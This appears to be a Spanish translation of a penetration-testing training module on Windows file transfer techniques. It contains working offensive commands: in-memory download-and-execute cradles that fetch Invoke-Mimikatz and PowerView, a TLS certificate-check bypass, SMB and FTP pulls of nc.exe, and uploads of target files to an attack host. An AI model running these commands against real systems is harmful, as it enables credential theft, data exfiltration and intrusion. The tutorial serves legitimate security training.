Claro, déjame corregirlo siguiendo tus indicaciones.

## Introduction

El sistema operativo Windows ha evolucionado en los últimos años, y las nuevas versiones vienen con diferentes utilidades para operaciones de transferencia de archivos. Comprender la transferencia de archivos en Windows puede ayudar tanto a atacantes como a defensores. Los atacantes pueden utilizar varios métodos de transferencia de archivos para operar y evitar ser detectados. Los defensores pueden aprender cómo funcionan estos métodos para monitorear y crear políticas correspondientes para evitar ser comprometidos. Utilicemos la [publicación del blog de Microsoft sobre el ataque Astaroth](https://www.microsoft.com/security/blog/2019/07/08/dismantling-a-fileless-campaign-microsoft-defender-atp-next-gen-protection-exposes-astaroth-attack/) como un ejemplo de una amenaza persistente avanzada (APT).

La publicación del blog comienza hablando sobre [fileless threats](https://www.microsoft.com/en-us/security/blog/2018/01/24/now-you-see-me-exposing-fileless-malware/). El término `fileless` sugiere que una amenaza no viene en un archivo, sino que utiliza herramientas legítimas integradas en un sistema para ejecutar un ataque. Esto no significa que no haya una operación de transferencia de archivos. Como se discute más adelante en esta sección, el archivo no está "presente" en el sistema, sino que se ejecuta en memoria.

El `Astaroth attack` generalmente siguió estos pasos: Un enlace malicioso en un correo electrónico de spear-phishing llevó a un archivo LNK. Al hacer doble clic, el archivo LNK provocó la ejecución de la [herramienta WMIC](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmic) con el parámetro "/Format", lo que permitió la descarga y ejecución de código JavaScript malicioso. El código JavaScript, a su vez, descarga payloads abusando de la [herramienta Bitsadmin](https://docs.microsoft.com/en-us/windows/win32/bits/bitsadmin-tool).

Todos los payloads estaban codificados en base64 y se decodificaron utilizando la herramienta Certutil, lo que resultó en algunos archivos DLL. La herramienta [regsvr32](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/regsvr32) se utilizó para cargar uno de los DLL decodificados, que descifró y cargó otros archivos hasta que el payload final, Astaroth, se inyectó en el proceso `Userinit`. A continuación se muestra una representación gráfica del ataque.

![image](https://academy.hackthebox.com/storage/modules/24/fig1a-astaroth-attack-chain.png)

[Image source](https://www.microsoft.com/security/blog/wp-content/uploads/2019/08/fig1a-astaroth-attack-chain.png)

Este es un excelente ejemplo de múltiples métodos para la transferencia de archivos y el actor de la amenaza utilizando esos métodos para eludir las defensas.

Esta sección discutirá el uso de algunas herramientas nativas de Windows para operaciones de descarga y carga. Más adelante en el módulo, discutiremos `Living Off The Land` binaries en Windows y Linux y cómo usarlas para realizar operaciones de transferencia de archivos.

---

## Download Operations

Tenemos acceso a la máquina `MS02` y necesitamos descargar un archivo desde nuestra máquina `Pwnbox`. Veamos cómo podemos lograr esto utilizando múltiples métodos de descarga de archivos.

![image](https://academy.hackthebox.com/storage/modules/24/WIN-download-PwnBox.png)

## PowerShell Base64 Encode & Decode

Dependiendo del tamaño del archivo que queremos transferir, podemos usar diferentes métodos que no requieren comunicación de red. Si tenemos acceso a un terminal, podemos codificar un archivo en una cadena base64, copiar su contenido desde el terminal y realizar la operación inversa, decodificando el archivo en el contenido original. Veamos cómo podemos hacer esto con PowerShell.

Un paso esencial al usar este método es asegurarse de que el archivo que codificas y decodificas sea correcto. Podemos usar [md5sum](https://man7.org/linux/man-pages/man1/md5sum.1.html), un programa que calcula y verifica checksums MD5 de 128 bits. El hash MD5 funciona como una huella digital compacta de un archivo, lo que significa que un archivo debe tener el mismo hash MD5 en todas partes. Intentemos transferir una clave ssh de muestra. Puede ser cualquier otra cosa, desde nuestra Pwnbox hasta el objetivo de Windows.

### Pwnbox Check SSH Key MD5 Hash

```r
md5sum id_rsa

4e301756a07ded0a2dd6953abf015278  id_rsa
```

### Pwnbox Encode SSH Key to Base64

```r
cat id_rsa |base64 -w 0;echo

LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=
```

Podemos copiar este contenido y pegarlo en un terminal de Windows PowerShell y usar algunas funciones de PowerShell para decodificarlo.

```r
PS C:\htb> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo="))
```

Finalmente, podemos confirmar si el archivo se transfirió correctamente utilizando el cmdlet [Get-FileHash](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-filehash?view=powershell-7.2), que hace lo mismo que `md5sum`.

### Confirming the MD5 Hashes Match

```r
PS C:\htb> Get-FileHash C:\Users\Public\id_rsa -Algorithm md5

Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
MD5             4E301756A07DED0A2DD6953ABF015278                                       C:\Users\Public\id_rsa
```

**Nota:** Aunque este método es conveniente, no siempre es posible usarlo. La utilidad de línea de comandos de Windows (cmd.exe) tiene una longitud máxima de cadena de 8,191 caracteres. Además, una web shell puede dar error si intentas enviar cadenas extremadamente largas.

---

## PowerShell Web Downloads

La mayoría de las empresas permiten tráfico saliente `HTTP` y `HTTPS` a través del firewall para permitir la productividad de los empleados. Aprovechar estos métodos de transporte para operaciones de transferencia de archivos es muy conveniente. Aun así, los defensores pueden usar soluciones de filtrado web para prevenir el acceso a categorías específicas de sitios web, bloquear la descarga de tipos de archivos (como .exe) o solo permitir el acceso a una lista de dominios permitidos en redes más restringidas.

PowerShell ofrece muchas opciones de transferencia de archivos. En cualquier versión de PowerShell, la clase [System.Net.WebClient](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-5.0) se puede usar para descargar un archivo a través de `HTTP`, `HTTPS` o `FTP`. La siguiente [tabla](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-6.0) describe los métodos de WebClient para descargar datos de un recurso:

|**Method**|**Description**|
|---|---|
|[OpenRead](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openread?view=net-6.0)|Devuelve los datos de un recurso como un [Stream](https://docs.microsoft.com/en-us/dotnet/api/system.io.stream?view=net-6.0).|
|[OpenReadAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openreadasync?view=net-6.0)|Devuelve los datos de un recurso sin bloquear el hilo de llamada.|
|[DownloadData](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=net-6.0)|Descarga datos de un recurso y devuelve una matriz de bytes.|
|[DownloadDataAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddataasync?view=net-6.0)|Descarga datos de un recurso y devuelve una matriz de bytes sin bloquear el hilo de llamada.|
|[DownloadFile](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-6.0)|Descarga datos de un recurso a un archivo local.|
|[DownloadFileAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfileasync?view=net-6.0)|Descarga datos de un recurso a un archivo local sin bloquear el hilo de llamada.|
|[DownloadString](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-6.0)|Descarga una cadena de un recurso y devuelve una cadena.|
|[DownloadStringAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstringasync?view=net-6.0)|Descarga una cadena de un recurso sin bloquear el hilo de llamada.|

Exploremos algunos ejemplos de esos métodos para descargar archivos usando PowerShell.

### PowerShell DownloadFile Method

Podemos especificar el nombre de la clase `Net.WebClient` y el método `DownloadFile` con los parámetros correspondientes a la URL del archivo de destino para descargar y el nombre del archivo de salida.

### File Download

```r
PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')

PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
```

### PowerShell DownloadString - Fileless Method

Como discutimos anteriormente, los ataques fileless funcionan utilizando algunas funciones del sistema operativo para descargar el payload y ejecutarlo directamente. PowerShell también se puede usar para realizar ataques fileless. En lugar de descargar un script de PowerShell en disco, podemos ejecutarlo directamente en memoria usando el cmdlet [Invoke-Expression](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2) o el alias `IEX`.

```r
PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```

`IEX` también acepta entrada de pipeline.

```r
PS C:\htb> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```

### PowerShell Invoke-WebRequest

Desde PowerShell 3.0 en adelante, el cmdlet [Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/m

icrosoft.powershell.utility/invoke-webrequest?view=powershell-7.2) también está disponible, pero es notablemente más lento para descargar archivos. Puedes usar los alias `iwr`, `curl` y `wget` en lugar del nombre completo `Invoke-WebRequest`.

```r
PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```

Harmj0y ha compilado una lista extensa de PowerShell download cradles [aquí](https://gist.github.com/HarmJ0y/bb48307ffa663256e239). Vale la pena familiarizarse con ellos y sus matices, como la falta de conciencia de proxy o tocar el disco (descargar un archivo en el objetivo) para seleccionar el adecuado para la situación.

### Common Errors with PowerShell

Puede haber casos en los que la configuración de primer lanzamiento de Internet Explorer no se haya completado, lo que impide la descarga.

![image](https://academy.hackthebox.com/storage/modules/24/IE_settings.png)

Esto se puede omitir utilizando el parámetro `-UseBasicParsing`.

```r
PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX

Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.
At line:1 char:1
+ Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException
+ FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand

PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```

Otro error en las descargas de PowerShell está relacionado con el canal seguro SSL/TLS si el certificado no es de confianza. Podemos omitir ese error con el siguiente comando:

```r
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

Exception calling "DownloadString" with "1" argument(s): "The underlying connection was closed: Could not establish trust
relationship for the SSL/TLS secure channel."
At line:1 char:1
+ IEX(New-Object Net.WebClient).DownloadString('https://raw.githubuserc ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : WebException
PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

---

## SMB Downloads

El protocolo Server Message Block (protocolo SMB) que se ejecuta en el puerto TCP/445 es común en redes empresariales donde se ejecutan servicios de Windows. Permite a las aplicaciones y usuarios transferir archivos hacia y desde servidores remotos.

Podemos usar SMB para descargar archivos fácilmente desde nuestra Pwnbox. Necesitamos crear un servidor SMB en nuestra Pwnbox con [smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) de Impacket y luego usar `copy`, `move`, PowerShell `Copy-Item` u otra herramienta que permita la conexión a SMB.

### Create the SMB Server

```r
sudo impacket-smbserver share -smb2support /tmp/smbshare

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Para descargar un archivo desde el servidor SMB al directorio de trabajo actual, podemos usar el siguiente comando:

### Copy a File from the SMB Server

```r
C:\htb> copy \\192.168.220.133\share\nc.exe

        1 file(s) copied.
```

Las nuevas versiones de Windows bloquean el acceso invitado no autenticado, como podemos ver en el siguiente comando:

```r
C:\htb> copy \\192.168.220.133\share\nc.exe

You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
```

Para transferir archivos en este escenario, podemos configurar un nombre de usuario y contraseña usando nuestro servidor SMB de Impacket y montar el servidor SMB en nuestra máquina objetivo de Windows:

### Create the SMB Server with a Username and Password

```r
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

### Mount the SMB Server with Username and Password

```r
C:\htb> net use n: \\192.168.220.133\share /user:test test

The command completed successfully.

C:\htb> copy n:\nc.exe
        1 file(s) copied.
```

**Nota:** También puedes montar el servidor SMB si recibes un error cuando usas `copy filename \\IP\sharename`.

---

## FTP Downloads

Otra forma de transferir archivos es utilizando FTP (File Transfer Protocol), que usa el puerto TCP/21 y TCP/20. Podemos usar el cliente FTP o PowerShell Net.WebClient para descargar archivos desde un servidor FTP.

Podemos configurar un servidor FTP en nuestro host de ataque utilizando el módulo Python3 `pyftpdlib`. Se puede instalar con el siguiente comando:

### Installing the FTP Server Python3 Module - pyftpdlib

```r
sudo pip3 install pyftpdlib
```

Luego podemos especificar el número de puerto 21 porque, por defecto, `pyftpdlib` utiliza el puerto 2121. La autenticación anónima está habilitada por defecto si no configuramos un usuario y contraseña.

### Setting up a Python3 FTP Server

```r
sudo python3 -m pyftpdlib --port 21

[I 2022-05-17 10:09:19] concurrency model: async
[I 2022-05-17 10:09:19] masquerade (NAT) address: None
[I 2022-05-17 10:09:19] passive ports: None
[I 2022-05-17 10:09:19] >>> starting FTP server on 0.0.0.0:21, pid=3210 <<<
```

Después de configurar el servidor FTP, podemos realizar transferencias de archivos utilizando el cliente FTP preinstalado de Windows o PowerShell `Net.WebClient`.

### Transfering Files from an FTP Server Using PowerShell

```r
PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```

Cuando obtenemos un shell en una máquina remota, es posible que no tengamos un shell interactivo. Si ese es el caso, podemos crear un archivo de comandos FTP para descargar un archivo. Primero, necesitamos crear un archivo que contenga los comandos que queremos ejecutar y luego usar el cliente FTP para usar ese archivo y descargar el archivo.

### Create a Command File for the FTP Client and Download the Target File

```r
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo GET file.txt >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye

C:\htb>more file.txt
This is a test file
```

---

## Upload Operations

También hay situaciones como el cracking de contraseñas, análisis, exfiltración, etc., donde debemos cargar archivos desde nuestra máquina objetivo a nuestro host de ataque. Podemos usar los mismos métodos que usamos para la operación de descarga, pero ahora para cargas. Veamos cómo podemos lograr cargar archivos de varias maneras.

---

## PowerShell Base64 Encode & Decode

Vimos cómo decodificar una cadena base64 usando PowerShell. Ahora, hagamos la operación inversa y codifiquemos un archivo para que podamos decodificarlo en nuestro host de ataque.

### Encode File Using PowerShell

```r
PS C:\htb> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))

IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo=
PS C:\htb> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash

Hash
----
3688374325B992DEF12793500307566D
```

Copiamos este contenido y lo pegamos en nuestro host de ataque, usamos el comando `base64` para decodificarlo y usamos la aplicación `md5sum` para confirmar que la transferencia se realizó correctamente.

### Decode Base64 String in Linux

```r
echo IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo= | base64 -d > hosts
```

```r
md5sum hosts 

3688374325b992def12793500307566d  hosts
```

---

## PowerShell Web Uploads

PowerShell no tiene una función integrada para operaciones de carga, pero podemos usar `Invoke-WebRequest` o `Invoke-RestMethod` para construir nuestra función de carga. También necesitaremos un servidor web que acepte cargas, lo cual no es una opción predeterminada en la mayoría de las utilidades de servidor web comunes.

Para nuestro servidor web, podemos usar [uploadserver](https://github.com/Densaugeo/uploadserver), un módulo extendido del módulo [HTTP.server de Python](https://docs.python.org/3/library/http.server.html), que incluye una página de carga de archivos. Vamos a instalarlo y a iniciar el servidor web.

### Installing a Configured WebServer with Upload

```r
pip3 install uploadserver

Collecting upload server
  Using cached uploadserver-2.0.1-py3-none-any.whl (6.9 kB)
Installing collected packages: uploadserver
Successfully installed uploadserver-2.0.1
```

```r
python3 -m uploadserver

File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Ahora podemos usar un script de PowerShell [PSUpload.ps1](https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1) que utiliza `Invoke-RestMethod` para realizar las operaciones de carga. El script acepta dos parámetros `-File`, que usamos para especificar la ruta del archivo, y `-Uri`, la URL del servidor donde cargaremos nuestro archivo. Intentemos cargar el archivo de host desde nuestro host de Windows.

### PowerShell Script to Upload a File to Python Upload Server

```r
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts

[+] File Uploaded:  C:\Windows\System32\drivers\etc\hosts
[+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373
```

### PowerShell Base64 Web Upload

Otra forma de usar PowerShell y archivos codificados en base64 para operaciones de carga es utilizando `Invoke-WebRequest` o `Invoke-RestMethod` junto con Netcat. Usamos Netcat para escuchar en un puerto que especificamos y enviamos el archivo como una solicitud `POST`. Finalmente, copiamos la salida y usamos la función de decodificación base64 para convertir la cadena en un archivo.

```r
PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

Capturamos los datos base64 con Netcat y usamos la aplicación base64 con la opción de decodificación para convertir la cadena en el archivo.

```r
nc -lvnp 8000

listening on [any] 8000 ...
connect to [192.168.49.128] from (UNKNOWN) [192.168.49.129] 50923
POST / HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.1682
Content-Type: application/x-www-form-urlencoded
Host: 192.168.49.128:8000
Content-Length: 1820
Connection: Keep-Alive

